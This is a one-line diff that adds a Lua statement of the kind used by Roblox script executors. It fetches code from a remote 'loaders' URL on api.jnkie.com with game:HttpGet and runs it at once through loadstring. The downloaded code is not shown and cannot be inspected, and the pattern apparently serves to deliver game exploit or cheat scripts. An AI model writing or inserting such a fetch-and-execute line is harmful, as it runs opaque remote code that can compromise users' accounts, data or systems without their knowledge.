@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/loaders/public/529aa1ed3784c493c2c96119277cff6c010d1bce54535254811ef850ed481145/download"))()
